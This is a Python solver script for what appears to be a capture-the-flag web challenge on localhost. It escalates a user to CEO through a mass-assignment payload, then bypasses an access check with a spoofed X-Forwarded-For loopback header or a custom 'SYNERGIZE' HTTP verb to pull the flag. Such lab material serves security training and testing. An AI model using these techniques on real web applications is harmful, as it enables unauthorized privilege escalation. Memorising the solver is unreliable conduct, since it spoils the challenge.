#!/usr/bin/env python3
"""
Automated Exploit Solver for Challenge 5: Initech SynergyDesk (Corporate Tricky Web)
Vulnerability: Mass Assignment + HTTP Verb Tampering / Header Origin Bypass
"""
import requests
import re
import sys

BASE_URL = "http://localhost:8005"

def solve():
    print("[*] Testing Challenge 5: Initech Corporate Synergy Exploit...")
    session = requests.Session()

    # Step 1: Elevate privileges via Mass Assignment on /api/employee/update-kpi
    print("[*] Sending Mass Assignment payload to elevate role to Chief_Executive_Officer...")
    elevate_payload = {
        "role": "Chief_Executive_Officer",
        "is_c_suite": True,
        "synergy_score": 9999,
        "department": "C-Suite Executive Suite"
    }
    
    r_kpi = session.post(f"{BASE_URL}/api/employee/update-kpi", json=elevate_payload)
    print(f"[+] Role update status: {r_kpi.json().get('message')}")

    # Step 2: Query the Executive Bonus Vault using loopback header bypass (or SYNERGIZE verb)
    print("[*] Requesting Executive Bonus Vault with boardroom header...")
    r_vault = session.get(
        f"{BASE_URL}/api/executive/bonus-vault",
        headers={"X-Forwarded-For": "127.0.0.1"}
    )
    
    data = r_vault.json()
    flag = data.get("flag")

    # If first method didn't return flag, try custom HTTP method SYNERGIZE
    if not flag:
        print("[*] Trying custom HTTP verb 'SYNERGIZE'...")
        r_synergize = session.request(
            "SYNERGIZE",
            f"{BASE_URL}/api/executive/bonus-vault"
        )
        flag = r_synergize.json().get("flag")

    if flag and "CTF{" in flag:
        print(f"\n[SUCCESS] Extracted CEO Bonus Flag: {flag}")
        return flag
    else:
        print(f"[-] Failed to claim bonus flag: {data}")
        sys.exit(1)

if __name__ == "__main__":
    solve()
